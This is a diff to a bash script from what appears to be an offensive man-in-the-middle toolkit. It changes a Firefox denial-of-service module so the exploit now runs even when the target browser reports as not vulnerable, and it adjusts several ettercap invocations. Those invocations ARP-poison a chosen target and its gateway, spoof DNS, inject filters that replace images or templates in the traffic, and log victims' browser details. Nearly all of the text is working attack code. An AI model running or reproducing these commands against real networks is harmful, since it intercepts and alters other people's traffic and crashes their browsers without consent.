@@ -9,7 +9,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 32 85 > /dev/null
+resize -s 33 85 > /dev/null
 # inicio
 
 
@@ -787,7 +787,7 @@ fi
 
 
 # ----------------------------------------------------
-# FIREFOX =< 49.0.0 DENIAL-OF-SERVICE [mitm+dns_spoof]
+# FIREFOX =< 49.0.1 DENIAL-OF-SERVICE [mitm+dns_spoof]
 # ----------------------------------------------------
 sh_stage7 () {
 echo ""
@@ -851,7 +851,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # check if target system its vuln
   # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
-  nOn="50"
+  nOn="50.0"
   Hod=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}`
   AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3,$4'}` > /dev/null 2>&1
   VeVul=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $8'} | cut -d '/' -f2` > /dev/null 2>&1
@@ -860,15 +860,16 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
   echo "${GreenF}    Firefox version : $VeVul ${BlueF}"
   sleep 1
   echo "${GreenF}    Accept-Language : $AcLa ${BlueF}"
-  sleep 2
+  sleep 1
 
 
 if [ $VeVul \> $nOn ]; then
 echo "${GreenF}    Browser report  :${RedF} not vulnerable...${BlueF}"
-sleep 3
-sh_exit
+sleep 2
+echo ${BlueF}[☠]${RedF} Running exploit againts a non-vulnerable target...${Reset};
+sleep 1
 else
-echo "${GreenF}    Browser report  : vulnerable to d0s...${BlueF}"
+echo "${GreenF}    Browser report  : vulnerable...${BlueF}"
 sleep 2
 fi
 
@@ -880,20 +881,20 @@ fi
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -P dns_spoof -L $IPATH/logs/UserAgent -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -971,20 +972,20 @@ sleep 1
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one// /$GaTe//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one// /$GaTe//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one// /$GaTe//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one// /$GaTe//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one/ /$GaTe/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one/ /$GaTe/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one/ /$GaTe/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one/ /$GaTe/
         fi
       fi
 
@@ -1053,20 +1054,20 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/template.ef -L $IPATH/logs/template -M ARP /$rhost/ /$gateway/
         fi
       fi
     
